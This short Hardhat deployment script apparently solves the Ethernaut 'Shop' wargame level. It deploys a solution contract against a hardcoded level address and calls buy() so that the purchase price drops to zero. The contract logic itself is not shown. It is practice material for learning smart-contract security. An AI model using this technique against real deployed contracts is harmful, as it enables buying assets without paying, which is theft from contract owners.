const { ethers } = require('hardhat');
const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const shopContract = '0xE89fB684CbE22CD3B8835f409eEbdA1A66F13832';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const ShopSolution = await ethers.getContractFactory('ShopSolution', deployer);
  const shopSolution = await ShopSolution.deploy(shopContract);

  const tx = await shopSolution.buy();
  await tx.wait();

  console.log('Price dropped to 0');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
